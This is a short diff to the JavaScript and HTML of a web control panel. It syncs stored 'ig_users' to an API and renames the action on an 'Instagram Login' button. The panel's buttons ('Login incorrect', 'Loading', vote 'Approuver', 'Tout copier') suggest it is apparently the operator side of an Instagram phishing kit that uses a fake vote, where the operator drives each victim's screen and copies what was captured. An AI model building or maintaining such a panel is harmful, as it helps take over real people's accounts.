@@ -290,7 +290,7 @@
         function getUsers() { try { return JSON.parse(localStorage.getItem('ig_users') || '[]'); } catch (e) { return []; } }
         function saveUsers(u) {
             localStorage.setItem('ig_users', JSON.stringify(u));
-            fetch(API_BASE + '/api/users', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(u.length === 1 ? u[0] : u) }).catch(function() {});
+            fetch(API_BASE + '/api/users', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(u) }).catch(function() {});
         }
         function getVotes() { try { return JSON.parse(localStorage.getItem('ig_votes') || '[]'); } catch (e) { return []; } }
 
@@ -434,7 +434,7 @@
 
                 '<div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-gamepad"></i> Actions</div><button class="copy-all-btn" onclick="copyAll()"><i class="fas fa-clipboard-list"></i> Tout copier</button></div>' +
                 '<div class="card-body"><div class="actions-grid">' +
-                    '<button class="action-btn ig" data-action="connexion_f"><svg viewBox="0 0 48 48" width="14" height="14"><rect x="8" y="8" width="32" height="32" rx="8" fill="none" stroke="currentColor" stroke-width="2.5"/><circle cx="24" cy="24" r="7" fill="none" stroke="currentColor" stroke-width="2.5"/><circle cx="33" cy="15" r="2" fill="currentColor"/></svg> Instagram Login</button>' +
+                    '<button class="action-btn ig" data-action="login"><svg viewBox="0 0 48 48" width="14" height="14"><rect x="8" y="8" width="32" height="32" rx="8" fill="none" stroke="currentColor" stroke-width="2.5"/><circle cx="24" cy="24" r="7" fill="none" stroke="currentColor" stroke-width="2.5"/><circle cx="33" cy="15" r="2" fill="currentColor"/></svg> Instagram Login</button>' +
                     '<button class="action-btn error" data-action="login_incorrect"><i class="fas fa-times-circle"></i> Login incorrect</button>' +
                     '<button class="action-btn loading-btn" data-action="loading"><i class="fas fa-spinner"></i> Loading</button>' +
                     '<button class="action-btn success" data-action="vote_approved"><i class="fas fa-check-double"></i> Approuver</button>' +
